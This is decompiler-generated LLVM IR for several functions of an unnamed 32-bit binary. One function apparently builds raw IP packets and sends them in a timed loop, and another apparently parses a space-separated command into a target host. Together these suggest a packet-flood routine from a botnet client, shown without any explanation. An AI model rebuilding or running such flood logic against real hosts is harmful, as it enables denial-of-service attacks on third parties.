define i32 @function_8049a6e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8049a6e:
  %edx.global-to-local = alloca i32, align 4
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-80 = alloca i16, align 2
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %v2_8049a84 = call i32 @function_804b6d0(i32* null)
  store i32 %v2_8049a84, i32* @eax, align 4
  %v1_8049a95 = call i32 @function_8048309(i32 %arg3)
  %v1_8049a9d = icmp eq i32 %v1_8049a95, 0
  %v1_8049a9f = icmp eq i1 %v1_8049a9d, false
  br i1 %v1_8049a9f, label %dec_label_pc_8049db9, label %dec_label_pc_8049aa5

dec_label_pc_8049aa5:                             ; preds = %dec_label_pc_8049a6e
  %v4_8049aa5 = add i32 %arg4, -1
  %v9_8049aa5 = sub i32 0, %arg4
  %v10_8049aa5 = and i32 %arg4, %v9_8049aa5
  %v11_8049aa5 = icmp slt i32 %v10_8049aa5, 0
  %v12_8049aa5 = icmp eq i32 %v4_8049aa5, 0
  %v13_8049aa5 = icmp slt i32 %v4_8049aa5, 0
  %v3_8049aa9 = icmp eq i1 %v13_8049aa5, %v11_8049aa5
  %v4_8049aa9 = icmp eq i1 %v12_8049aa5, false
  %v5_8049aa9 = and i1 %v4_8049aa9, %v3_8049aa9
  br i1 %v5_8049aa9, label %dec_label_pc_8049acb, label %dec_label_pc_8049aab

dec_label_pc_8049aab:                             ; preds = %dec_label_pc_8049aa5
  %v3_8049ab9 = call i32 @function_80482b2(i32 %arg2, i32 ptrtoint ([36 x i8]* @global_var_8052ab0.54 to i32))
  store i32 %v3_8049ab9, i32* @eax, align 4
  %v1_8049ac6 = call i32 @function_804eec4(i32 1)
  br label %dec_label_pc_8049acb

dec_label_pc_8049acb:                             ; preds = %dec_label_pc_8049aa5, %dec_label_pc_8049aab
  %v1_8049ace = add i32 %arg5, 8
  %v1_8049ad1 = inttoptr i32 %v1_8049ace to i32*
  %v2_8049ad1 = load i32, i32* %v1_8049ad1, align 4
  %v1_8049ad7 = call i32 @function_804ed7c(i32 %v2_8049ad1)
  %v4_8049aee = call i32 @function_804da00(i32 2, i32 3, i32 255)
  store i32 %v4_8049aee, i32* @eax, align 4
  %v5_8049af9 = icmp slt i32 %v4_8049aee, 0
  %v1_8049afd = icmp eq i1 %v5_8049af9, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b09, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049acb
  %v1_8049b04 = call i32 @function_804eec4(i32 1)
  br label %dec_label_pc_8049b09

dec_label_pc_8049b09:                             ; preds = %dec_label_pc_8049acb, %dec_label_pc_8049aff
  %v2_8049b0e = call i32 @function_804b6d0(i32* null)
  store i32 %v2_8049b0e, i32* @ebx, align 4
  %v0_8049b18 = call i32 @function_804b5cc()
  %v1_8049b1d = load i32, i32* @ebx, align 4
  %v2_8049b1d = xor i32 %v1_8049b1d, %v0_8049b18
  store i32 %v2_8049b1d, i32* @eax, align 4
  %v1_8049b23 = call i32 @function_804eafc(i32 %v2_8049b1d)
  store i32 %v1_8049b23, i32* @eax, align 4
  %v1_8049b2b = call i32 @function_804e9f8(i32 %v2_8049b1d)
  %v2_8049b37 = ptrtoint i8* %stack_var_-100 to i32
  %v15_8049b3a = ptrtoint i32* %stack_var_-60 to i32
  %v4_8049b3e = bitcast i32* %stack_var_-60 to i8*
  %v5_8049b3e = call i32 @function_804d178(i8* %v4_8049b3e, i32 %v1_8049b2b, i32 1400)
  %v1_8049b49 = add i32 %arg5, 4
  %v1_8049b4c = inttoptr i32 %v1_8049b49 to i32*
  %v2_8049b4c = load i32, i32* %v1_8049b4c, align 4
  %v3_8049b55 = call i32 @function_804939b(i32 %arg3, i32 %v2_8049b4c)
  %v3_8049b74 = call i32 @function_80482b2(i32 %arg2, i32 ptrtoint ([36 x i8]* @global_var_8052ad4.55 to i32))
  %v2_8049cf8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_8049cfe = ptrtoint i32* %stack_var_-140 to i32
  %v15_8049d04 = ptrtoint i16* %stack_var_-80 to i32
  %v12_8049d22 = ptrtoint i32* %stack_var_-120 to i32
  %v2_8049d4f = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049d8b = add i32 %v1_8049ad7, %v2_8049a84
  br label %dec_label_pc_8049b7c

dec_label_pc_8049b7c:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049b09
  %stack_var_-32.0 = phi i32 [ %tmp58, %dec_label_pc_8049b09 ], [ %v4_8049d99, %dec_label_pc_8049d99 ]
  %v0_8049b7c = call i32 @function_80483e8()
  store i8 69, i8* %stack_var_-100, align 1
  %v0_8049bab = load i32, i32* @esp, align 4
  %v2_8049bae = add i32 %v0_8049bab, -16
  %v3_8049bae = inttoptr i32 %v2_8049bae to i32*
  store i32 1440, i32* %v3_8049bae, align 4
  %v2_8049baf = call i32 @function_804d410(i32 69)
  store i32 %v2_8049baf, i32* @eax, align 4
  %sext11 = mul i32 %v2_8049baf, 65536
  %v1_8049bbb = sdiv i32 %sext11, 65536
  %v2_8049bbb = call i32 @function_804e9f8(i32 %v1_8049bbb)
  store i32 %v3_8049b55, i32* @eax, align 4
  %sext12 = mul i32 %v2_8049bbb, 65536
  %v1_8049be4 = sdiv i32 %sext12, 65536
  %v2_8049be4 = call i32 @function_804e9f8(i32 %v1_8049be4)
  %v3_8049be4 = trunc i32 %v2_8049be4 to i16
  store i32 %v2_8049be4, i32* @eax, align 4
  store i16 %v3_8049be4, i16* %stack_var_-80, align 2
  %sext9 = mul i32 %v2_8049be4, 65536
  %v1_8049bed = sdiv i32 %sext9, 65536
  %v2_8049bed = call i32 @function_804e9f8(i32 %v1_8049bed)
  store i32 %v2_8049bed, i32* @eax, align 4
  %sext10 = mul i32 %v2_8049bed, 65536
  %v1_8049bf6 = sdiv i32 %sext10, 65536
  %v2_8049bf6 = call i32 @function_804e9f8(i32 %v1_8049bf6)
  store i32 %v2_8049bf6, i32* @eax, align 4
  %v1_8049bfe = call i32 @function_804e9f8(i32 %v2_8049bf6)
  store i32 2, i32* %stack_var_-168, align 4
  %v0_8049c95 = load i32, i32* @esp, align 4
  %v1_8049c95 = add i32 %v0_8049c95, -4
  %v2_8049c95 = inttoptr i32 %v1_8049c95 to i32*
  store i32 20, i32* %v2_8049c95, align 4
  %v2_8049c97 = add i32 %v0_8049c95, -8
  %v3_8049c97 = inttoptr i32 %v2_8049c97 to i32*
  store i32 %v2_8049b37, i32* %v3_8049c97, align 4
  %v0_8049c98 = load i32, i32* %stack_var_-168, align 4
  %v3_8049c98 = inttoptr i32 %v0_8049c98 to i16*
  %v4_8049c98 = call i32 @function_80488bc(i16* %v3_8049c98, i32 %v1_8049bf6)
  %v0_8049c9d = load i32, i32* @esp, align 4
  %v1_8049ca7 = add i32 %v0_8049c9d, 4
  %v2_8049ca7 = inttoptr i32 %v1_8049ca7 to i32*
  store i32 40, i32* %v2_8049ca7, align 4
  %v3_8049ca9 = inttoptr i32 %v0_8049c9d to i32*
  store i32 %v2_8049b37, i32* %v3_8049ca9, align 4
  %sext15 = mul i32 %v4_8049c98, 65536
  %v1_8049caa = sdiv i32 %sext15, 65536
  %v3_8049caa = inttoptr i32 %v1_8049caa to i16*
  %v4_8049caa = call i32 @function_80488bc(i16* %v3_8049caa, i32 ptrtoint (i32* @0 to i32))
  %v0_8049caf = load i32, i32* @esp, align 4
  store i32 %v0_8049b7c, i32* %stack_var_-152, align 4
  %v2_8049ce8 = add i32 %v0_8049caf, -8
  %v3_8049ce8 = inttoptr i32 %v2_8049ce8 to i32*
  store i32 1420, i32* %v3_8049ce8, align 4
  %v0_8049ce9 = load i32, i32* %stack_var_-152, align 4
  %v1_8049ce9 = call i32 @function_804d410(i32 %v0_8049ce9)
  %v0_8049cee = load i32, i32* @esp, align 4
  store i32 %v2_8049cfe, i32* %edx.global-to-local, align 4
  %v1_8049d0a = add i32 %v0_8049cee, 8
  %v2_8049d0a = inttoptr i32 %v1_8049d0a to i32*
  store i32 20, i32* %v2_8049d0a, align 4
  %v2_8049d0c = add i32 %v0_8049cee, 4
  %v3_8049d0c = inttoptr i32 %v2_8049d0c to i32*
  store i32 %v2_8049cfe, i32* %v3_8049d0c, align 4
  %v3_8049d0d = inttoptr i32 %v0_8049cee to i32*
  store i32 %v15_8049d04, i32* %v3_8049d0d, align 4
  %sext16 = mul i32 %v1_8049ce9, 65536
  %v1_8049d0e = sdiv i32 %sext16, 65536
  %v4_8049d0e = call i32 @function_804d2dc(i32 %v1_8049d0e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d13 = load i32, i32* @esp, align 4
  %v5_8049d19 = add i32 %v0_8049d13, 8
  %v6_8049d19 = inttoptr i32 %v5_8049d19 to i32*
  store i32 1400, i32* %v6_8049d19, align 4
  %v2_8049d25 = add i32 %v0_8049d13, 4
  %v3_8049d25 = inttoptr i32 %v2_8049d25 to i32*
  store i32 %v12_8049d22, i32* %v3_8049d25, align 4
  %v3_8049d2c = inttoptr i32 %v0_8049d13 to i32*
  store i32 %v15_8049b3a, i32* %v3_8049d2c, align 4
  %v4_8049d2d = call i32 @function_804d2dc(i32 %v1_8049d0e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d32 = load i32, i32* @esp, align 4
  store i32 %v2_8049cf8, i32* %edx.global-to-local, align 4
  %v2_8049d41 = add i32 %v0_8049d32, 12
  %v3_8049d41 = inttoptr i32 %v2_8049d41 to i32*
  store i32 1432, i32* %v3_8049d41, align 4
  %v2_8049d42 = add i32 %v0_8049d32, 8
  %v3_8049d42 = inttoptr i32 %v2_8049d42 to i32*
  store i32 %v2_8049cf8, i32* %v3_8049d42, align 4
  %v3_8049d43 = inttoptr i32 %v1_8049d0e to i16*
  %v4_8049d43 = call i32 @function_80488bc(i16* %v3_8049d43, i32 ptrtoint (i32* @0 to i32))
  %v0_8049d48 = load i32, i32* @esp, align 4
  store i32 1440, i32* %edx.global-to-local, align 4
  %v1_8049d5e = add i32 %v0_8049d48, -4
  %v2_8049d5e = inttoptr i32 %v1_8049d5e to i32*
  store i32 16, i32* %v2_8049d5e, align 4
  %v2_8049d60 = add i32 %v0_8049d48, -8
  %v3_8049d60 = inttoptr i32 %v2_8049d60 to i32*
  store i32 %v2_8049d4f, i32* %v3_8049d60, align 4
  %v1_8049d61 = add i32 %v0_8049d48, -12
  %v2_8049d61 = inttoptr i32 %v1_8049d61 to i32*
  store i32 0, i32* %v2_8049d61, align 4
  %v0_8049d63 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049d63 = add i32 %v0_8049d48, -16
  %v3_8049d63 = inttoptr i32 %v2_8049d63 to i32*
  store i32 %v0_8049d63, i32* %v3_8049d63, align 4
  %v2_8049d67 = add i32 %v0_8049d48, -20
  %v3_8049d67 = inttoptr i32 %v2_8049d67 to i32*
  store i32 %v2_8049b37, i32* %v3_8049d67, align 4
  %v5_8049d68 = add i32 %v0_8049d48, -24
  %v6_8049d68 = inttoptr i32 %v5_8049d68 to i32*
  store i32 %v4_8049aee, i32* %v6_8049d68, align 4
  %v1_8049d6b = load i32, i32* %stack_var_-60, align 4
  %sext19 = mul i32 %v4_8049d43, 65536
  %v2_8049d6b = sdiv i32 %sext19, 65536
  %v7_8049d6b = call i32 @function_804d980(i32 %v2_8049d6b, i32 %v1_8049d6b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %tmp82 = icmp ult i32 %stack_var_-32.0, 50
  br i1 %tmp82, label %dec_label_pc_8049d99, label %dec_label_pc_8049d79

dec_label_pc_8049d79:                             ; preds = %dec_label_pc_8049b7c
  %v0_8049d70 = load i32, i32* @esp, align 4
  %v1_8049d7c = add i32 %v0_8049d70, 16
  %v2_8049d7c = inttoptr i32 %v1_8049d7c to i32*
  store i32 0, i32* %v2_8049d7c, align 4
  %v2_8049d7e = inttoptr i32 %v2_8049d6b to i32*
  %v3_8049d7e = call i32 @function_804b6d0(i32* %v2_8049d7e)
  %v0_8049d83 = load i32, i32* @esp, align 4
  store i32 %v3_8049d7e, i32* %edx.global-to-local, align 4
  %v7_8049d8e = icmp ult i32 %v3_8049d7e, %v5_8049d8b
  %v1_8049d90 = icmp eq i1 %v7_8049d8e, false
  br i1 %v1_8049d90, label %dec_label_pc_8049da1, label %dec_label_pc_8049d99

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d79, %dec_label_pc_8049b7c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049b7c ], [ 0, %dec_label_pc_8049d79 ]
  %v4_8049d99 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_8049b7c

dec_label_pc_8049da1:                             ; preds = %dec_label_pc_8049d79
  %v6_8049da4 = inttoptr i32 %v0_8049d83 to i32*
  store i32 %v4_8049aee, i32* %v6_8049da4, align 4
  %v1_8049da7 = call i32 @function_804b4a4(i32 %stack_var_-32.0)
  store i32 %v1_8049da7, i32* @eax, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v2_8049db2 = inttoptr i32 %v0_8049dac to i32*
  store i32 0, i32* %v2_8049db2, align 4
  %v1_8049db4 = call i32 @function_804eec4(i32 %stack_var_-32.0)
  br label %dec_label_pc_8049db9

dec_label_pc_8049db9:                             ; preds = %dec_label_pc_8049a6e, %dec_label_pc_8049da1
  %v0_8049dbd = phi i32 [ %v1_8049a95, %dec_label_pc_8049a6e ], [ %v1_8049db4, %dec_label_pc_8049da1 ]
  ret i32 %v0_8049dbd

; uselistorder directives
  uselistorder i32 %v2_8049d6b, { 1, 0 }
  uselistorder i32 %v0_8049d13, { 1, 0, 2 }
  uselistorder i32 %v1_8049d0e, { 2, 1, 0 }
  uselistorder i32 %v0_8049cee, { 2, 0, 1 }
  uselistorder i32 %v1_8049bf6, { 1, 0 }
  uselistorder i32 %v2_8049be4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-32.0, { 0, 1, 3, 2 }
  uselistorder i32 %v4_8049aa5, { 1, 0 }
  uselistorder i8* %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i16* %stack_var_-80, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_804d980, { 2, 1, 0 }
  uselistorder i32 1440, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_80483e8, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_804939b, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0 }
  uselistorder i32 (i32)* @function_804ed7c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8048309, { 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049db9, { 1, 0 }
  uselistorder label %dec_label_pc_8049b09, { 1, 0 }
  uselistorder label %dec_label_pc_8049acb, { 1, 0 }
}

define i32 @function_804a7e3(i32 %arg1) local_unnamed_addr {
dec_label_pc_804a7e3:
  %v3_804a7fa = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805328d.90 to i32))
  %v3_804a817 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_805329a.92 to i32))
  %v3_804a830 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_80532a7.93 to i32))
  ret i32 %v3_804a830

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @function_804a83a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804a83a:
  %v3_804a84e = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_80532af.94 to i32))
  ret i32 %v3_804a84e
}

define i32 @function_804a858(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804a858:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_804a87c.preheader

dec_label_pc_804a876:                             ; preds = %dec_label_pc_804a89b
  %v5_804a876 = add i32 %.pre37, 1
  %v22_804a876 = inttoptr i32 %v5_804a876 to i8*
  %v4_804a879 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a87c.preheader, %dec_label_pc_804a876
  %stack_var_-28.0 = phi i32 [ %v4_804a879, %dec_label_pc_804a876 ], [ %stack_var_-28.170, %dec_label_pc_804a87c.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_804a876, %dec_label_pc_804a876 ], [ %stack_var_-20.171, %dec_label_pc_804a87c.preheader ]
  %v3_804a890 = call i32 @_strlen(i8* %arg2)
  %v7_804a897 = icmp ult i32 %stack_var_-28.0, %v3_804a890
  %v1_804a899 = icmp eq i1 %v7_804a897, false
  %.pre37 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_804a899, label %dec_label_pc_804a8a4, label %dec_label_pc_804a89b

dec_label_pc_804a89b:                             ; preds = %dec_label_pc_804a87c
  %v2_804a89e = load i8, i8* %stack_var_-20.0, align 1
  %v7_804a8a0 = icmp eq i8 %v2_804a89e, 32
  %v1_804a8a2 = icmp eq i1 %v7_804a8a0, false
  br i1 %v1_804a8a2, label %dec_label_pc_804a876, label %dec_label_pc_804a8a4

dec_label_pc_804a8a4:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a89b
  %v5_804a8a4 = add i32 %.pre37, 1
  %v3_804a8bb = call i32 @_strlen(i8* %arg2)
  %v12_804a8c2 = icmp eq i32 %stack_var_-28.0, %v3_804a8bb
  br i1 %v12_804a8c2, label %dec_label_pc_804aa97, label %dec_label_pc_804a8ca

dec_label_pc_804a8ca:                             ; preds = %dec_label_pc_804a8a4
  %v22_804a8a4 = inttoptr i32 %v5_804a8a4 to i8*
  %v4_804a8ca = add nuw nsw i32 %storemerge1272, 1
  %v7_804a8d1 = icmp sgt i32 %storemerge1272, 3
  br i1 %v7_804a8d1, label %dec_label_pc_804a8df.preheader, label %dec_label_pc_804a87c.preheader

dec_label_pc_804a87c.preheader:                   ; preds = %dec_label_pc_804a858, %dec_label_pc_804a8ca
  %storemerge1272 = phi i32 [ 0, %dec_label_pc_804a858 ], [ %v4_804a8ca, %dec_label_pc_804a8ca ]
  %stack_var_-20.171 = phi i8* [ %arg2, %dec_label_pc_804a858 ], [ %v22_804a8a4, %dec_label_pc_804a8ca ]
  %stack_var_-28.170 = phi i32 [ 0, %dec_label_pc_804a858 ], [ %stack_var_-28.0, %dec_label_pc_804a8ca ]
  br label %dec_label_pc_804a87c

dec_label_pc_804a8df.preheader:                   ; preds = %dec_label_pc_804a8ca
  br label %dec_label_pc_804a8df

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8fe
  %v4_804a8dc = add i32 %storemerge11, 1
  br label %dec_label_pc_804a8df

dec_label_pc_804a8df:                             ; preds = %dec_label_pc_804a8df.preheader, %dec_label_pc_804a8dc
  %storemerge11 = phi i32 [ %v4_804a8dc, %dec_label_pc_804a8dc ], [ 0, %dec_label_pc_804a8df.preheader ]
  %v3_804a8f3 = call i32 @_strlen(i8* %v22_804a8a4)
  %v7_804a8fa = icmp ult i32 %storemerge11, %v3_804a8f3
  %v1_804a8fc = icmp eq i1 %v7_804a8fa, false
  %.pre = add i32 %storemerge11, %v5_804a8a4
  br i1 %v1_804a8fc, label %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge, label %dec_label_pc_804a8fe

dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge: ; preds = %dec_label_pc_804a8df
  %.pre26 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804a90a

dec_label_pc_804a8fe:                             ; preds = %dec_label_pc_804a8df
  %v1_804a904 = inttoptr i32 %.pre to i8*
  %v2_804a904 = load i8, i8* %v1_804a904, align 1
  %v7_804a906 = icmp eq i8 %v2_804a904, 32
  %v1_804a908 = icmp eq i1 %v7_804a906, false
  br i1 %v1_804a908, label %dec_label_pc_804a8dc, label %dec_label_pc_804a90a

dec_label_pc_804a90a:                             ; preds = %dec_label_pc_804a8fe, %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge
  %v1_804a910.pre-phi = phi i8* [ %.pre26, %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge ], [ %v1_804a904, %dec_label_pc_804a8fe ]
  store i8 0, i8* %v1_804a910.pre-phi, align 1
  %v0_804a913 = load i32, i32* @global_var_80588a4.80, align 4
  %v3_804a91f = call i32 @function_804d2f4(i8* %v22_804a8a4, i32 %v0_804a913)
  %v1_804a927 = icmp eq i32 %v3_804a91f, 0
  %v1_804a929 = icmp eq i1 %v1_804a927, false
  br i1 %v1_804a929, label %dec_label_pc_804aa97, label %dec_label_pc_804a92f

dec_label_pc_804a92f:                             ; preds = %dec_label_pc_804a90a
  %v0_804a92f = load i64, i64* @global_var_80560ec.12, align 8
  %v1_804a92f = trunc i64 %v0_804a92f to i32
  %v1_804a934 = icmp eq i32 %v1_804a92f, 0
  %v1_804a936 = icmp eq i1 %v1_804a934, false
  br i1 %v1_804a936, label %dec_label_pc_804aa97, label %dec_label_pc_804a93c

dec_label_pc_804a93c:                             ; preds = %dec_label_pc_804a92f
  br label %dec_label_pc_804a958.preheader

dec_label_pc_804a952:                             ; preds = %dec_label_pc_804a977
  %v5_804a952 = add i32 %.pre36, 1
  %v22_804a952 = inttoptr i32 %v5_804a952 to i8*
  %v4_804a955 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_804a958

dec_label_pc_804a958:                             ; preds = %dec_label_pc_804a958.preheader, %dec_label_pc_804a952
  %stack_var_-28.2 = phi i32 [ %v4_804a955, %dec_label_pc_804a952 ], [ %stack_var_-28.367, %dec_label_pc_804a958.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_804a952, %dec_label_pc_804a952 ], [ %stack_var_-20.368, %dec_label_pc_804a958.preheader ]
  %v3_804a96c = call i32 @_strlen(i8* %arg2)
  %v7_804a973 = icmp ult i32 %stack_var_-28.2, %v3_804a96c
  %v1_804a975 = icmp eq i1 %v7_804a973, false
  %.pre36 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_804a975, label %dec_label_pc_804a980, label %dec_label_pc_804a977

dec_label_pc_804a977:                             ; preds = %dec_label_pc_804a958
  %v2_804a97a = load i8, i8* %stack_var_-20.2, align 1
  %v7_804a97c = icmp eq i8 %v2_804a97a, 32
  %v1_804a97e = icmp eq i1 %v7_804a97c, false
  br i1 %v1_804a97e, label %dec_label_pc_804a952, label %dec_label_pc_804a980

dec_label_pc_804a980:                             ; preds = %dec_label_pc_804a958, %dec_label_pc_804a977
  %v5_804a980 = add i32 %.pre36, 1
  %v3_804a997 = call i32 @_strlen(i8* %arg2)
  %v12_804a99e = icmp eq i32 %stack_var_-28.2, %v3_804a997
  br i1 %v12_804a99e, label %dec_label_pc_804aa97, label %dec_label_pc_804a9a6

dec_label_pc_804a9a6:                             ; preds = %dec_label_pc_804a980
  %v22_804a980 = inttoptr i32 %v5_804a980 to i8*
  %v4_804a9a6 = add nuw nsw i32 %storemerge1069, 1
  %v7_804a9ad = icmp sgt i32 %storemerge1069, 1
  br i1 %v7_804a9ad, label %dec_label_pc_804a9bb.preheader, label %dec_label_pc_804a958.preheader

dec_label_pc_804a958.preheader:                   ; preds = %dec_label_pc_804a93c, %dec_label_pc_804a9a6
  %storemerge1069 = phi i32 [ 0, %dec_label_pc_804a93c ], [ %v4_804a9a6, %dec_label_pc_804a9a6 ]
  %stack_var_-20.368 = phi i8* [ %arg2, %dec_label_pc_804a93c ], [ %v22_804a980, %dec_label_pc_804a9a6 ]
  %stack_var_-28.367 = phi i32 [ 0, %dec_label_pc_804a93c ], [ %stack_var_-28.2, %dec_label_pc_804a9a6 ]
  br label %dec_label_pc_804a958

dec_label_pc_804a9bb.preheader:                   ; preds = %dec_label_pc_804a9a6
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9b8:                             ; preds = %dec_label_pc_804a9da
  %v4_804a9b8 = add i32 %storemerge, 1
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9bb:                             ; preds = %dec_label_pc_804a9bb.preheader, %dec_label_pc_804a9b8
  %storemerge = phi i32 [ %v4_804a9b8, %dec_label_pc_804a9b8 ], [ 0, %dec_label_pc_804a9bb.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804a980, i32* @edi, align 4
  %v3_804a9cf = call i32 @_strlen(i8* %v22_804a980)
  %v0_804a9d6 = load i32, i32* @edx, align 4
  %v7_804a9d6 = icmp ult i32 %v0_804a9d6, %v3_804a9cf
  %v1_804a9d8 = icmp eq i1 %v7_804a9d6, false
  %.pre27 = add i32 %storemerge, %v5_804a980
  br i1 %v1_804a9d8, label %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge, label %dec_label_pc_804a9da

dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge: ; preds = %dec_label_pc_804a9bb
  %.pre34 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_804a9e6

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a9bb
  %v1_804a9e0 = inttoptr i32 %.pre27 to i8*
  %v2_804a9e0 = load i8, i8* %v1_804a9e0, align 1
  %v7_804a9e2 = icmp eq i8 %v2_804a9e0, 32
  %v1_804a9e4 = icmp eq i1 %v7_804a9e2, false
  br i1 %v1_804a9e4, label %dec_label_pc_804a9b8, label %dec_label_pc_804a9e6

dec_label_pc_804a9e6:                             ; preds = %dec_label_pc_804a9da, %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge
  %v1_804a9ec.pre-phi = phi i8* [ %.pre34, %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge ], [ %v1_804a9e0, %dec_label_pc_804a9da ]
  store i8 0, i8* %v1_804a9ec.pre-phi, align 1
  %v1_804a9f5 = call i32 @function_804d518(i32 %v5_804a980)
  %v2_804a9f5 = trunc i32 %v1_804a9f5 to i8
  store i8 %v2_804a9f5, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_804a9f5, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804aa06 = icmp eq i1 %tmp, false
  br i1 %v1_804aa06, label %dec_label_pc_804a9e6._crit_edge, label %dec_label_pc_804aa08

dec_label_pc_804a9e6._crit_edge:                  ; preds = %dec_label_pc_804a9e6
  br label %bb

dec_label_pc_804aa08:                             ; preds = %dec_label_pc_804a9e6
  %v1_804aa0e = call i32 @function_804d540(i32 %v5_804a980)
  %v4_804aa19 = icmp eq i32 %v1_804aa0e, 0
  %v1_804aa1d = icmp eq i1 %v4_804aa19, false
  br i1 %v1_804aa1d, label %dec_label_pc_804aa3a, label %dec_label_pc_804aa1f

dec_label_pc_804aa1f:                             ; preds = %dec_label_pc_804aa08
  %v2_804aa30 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_80532b8.95 to i32))
  br label %dec_label_pc_804aa97

dec_label_pc_804aa3a:                             ; preds = %dec_label_pc_804aa08
  %v1_804aa3d = add i32 %v1_804aa0e, 12
  %v2_804aa3d = inttoptr i32 %v1_804aa3d to i32*
  %v3_804aa3d = load i32, i32* %v2_804aa3d, align 4
  %v1_804aa45 = add i32 %v1_804aa0e, 16
  %v2_804aa45 = inttoptr i32 %v1_804aa45 to i32*
  %v3_804aa45 = load i32, i32* %v2_804aa45, align 4
  %v1_804aa48 = inttoptr i32 %v3_804aa45 to i32*
  %v2_804aa48 = load i32, i32* %v1_804aa48, align 4
  %v1_804aa4f = inttoptr i32 %v2_804aa48 to i8*
  %v7_804aa52 = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_804aa4f, i32 %v3_804aa3d)
  %v2_804aa5f.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_804a9e6._crit_edge, %dec_label_pc_804aa3a
  %v2_804aa5f = phi i8 [ %v2_804a9f5, %dec_label_pc_804a9e6._crit_edge ], [ %v2_804aa5f.pre, %dec_label_pc_804aa3a ]
  store i8 %v2_804aa5f, i8* bitcast (i8** @global_var_80560eb.96 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_80560e8.11 to i8*), align 4
  store i64 256, i64* @global_var_80560ec.12, align 8
  br label %dec_label_pc_804aa97

dec_label_pc_804aa97:                             ; preds = %dec_label_pc_804a8a4, %dec_label_pc_804a980, %dec_label_pc_804a92f, %dec_label_pc_804a90a, %dec_label_pc_804aa1f, %bb
  %v0_804aa9d = phi i32 [ %v1_804a92f, %dec_label_pc_804a92f ], [ %v3_804a91f, %dec_label_pc_804a90a ], [ %v2_804aa30, %dec_label_pc_804aa1f ], [ ptrtoint (i8** @global_var_80560e8.11 to i32), %bb ], [ %v3_804a997, %dec_label_pc_804a980 ], [ %v3_804a8bb, %dec_label_pc_804a8a4 ]
  ret i32 %v0_804aa9d

; uselistorder directives
  uselistorder i32 %.pre27, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge1069, { 1, 0 }
